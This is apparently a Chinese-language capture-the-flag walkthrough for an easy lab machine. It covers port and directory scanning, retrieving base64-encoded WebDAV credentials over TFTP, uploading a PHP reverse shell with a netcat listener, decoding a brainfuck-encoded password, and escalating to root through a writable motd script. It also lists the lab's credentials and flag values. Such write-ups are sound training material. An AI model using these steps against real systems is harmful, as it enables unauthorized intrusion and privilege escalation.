## 靶机信息
目标:找到user.txt && root.txt
级别:容易

## Recon
### nmap
```shell
nmap -sn 192.168.1.0/24
//IP:192.168.1.140

sudo nmap -sT --min-rate 10000 -p- 192.168.1.140
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Web
### 目录爆破
```shell
sudo gobuster dir -u http://192.168.1.140 -w /usr/share/wordlists/dirb/common.txt -x txt,php,html
```
- -x:指定扩展名
```shell
//找到/tips.txt 文件
```
![[Pasted image 20231006175919.png]]
```shell
//打开creds.txt目录
//web打开发现不存在
//进行UDP端口扫描
sudo nmap -sU --min-rate 10000 --top-ports 20 192.168.1.140 
//69端口是tftp，creds.txt可能是tftp的文件
```
![[Pasted image 20231006180821.png]]
```shell
tftp 192.168.1.140
get creds.txt

cat creds.txt
eWFtZG9vdDpTd2FyZw==

echo "eWFtZG9vdDpTd2FyZw==" | base64 -d
//得到WebDav凭证
yamdoot:Swarg
```

## WebDav
![[Pasted image 20231006191135.png]]
### cadaver
```shell
cadaver http://192.168.1.140/webdav
Username: yamdoot
Password: Swarg

dav:/webdav/> put php-reverse-shell.php  //kali自带websehll地址:/usr/share/webshell

sudo nc -lvnp 1234

```
本地开启监听，网页中点击shell，得到立足点

## 提权
```shell
//TTY shell
python3 -c "import pty;pty.spawn('/bin/bash')"

/home/inferno 中找到user.txt
Flag: {5f95bf06ce19af69bfa5e53f797ce6e2}
```

### brainfuck
```shell
find / -type f -perm -ug=rwx 2>/dev/null
//看到一个shell脚本
```
![[Pasted image 20231006201848.png]]
![[Pasted image 20231006201923.png]]
```shell
//发现是brainfuck加密，在线解密 https://www.splitbrain.org/services/ook
解密后得到:chitragupt
```
![[Pasted image 20231007101014.png]]
passwd文件中看到inferno用户，尝试用chitragupt登录inferno。

## motd.d
```shell
inferno@ubuntu:~$ find / -type f -perm -ug=rwx 2>/dev/null
```
![[Pasted image 20231007110139.png]]
![[Pasted image 20231007110228.png]]
看到这个文件是可以执行命令，此时执行的是welcome信息。通过可以执行命令这一点改变root的密码(最好用nano打开文件，vi打开会有问题)
![[Pasted image 20231007110446.png]]
![[Pasted image 20231007110636.png]]
可以看到执行了00-hearder中的命令

重新登录inferno用户，执行su root，密码为passwd
成功切换到root用户
```shell
Root Flag: {9440aee508b6215995219c58c8ba4b45}
```
![[Pasted image 20231007110749.png]]




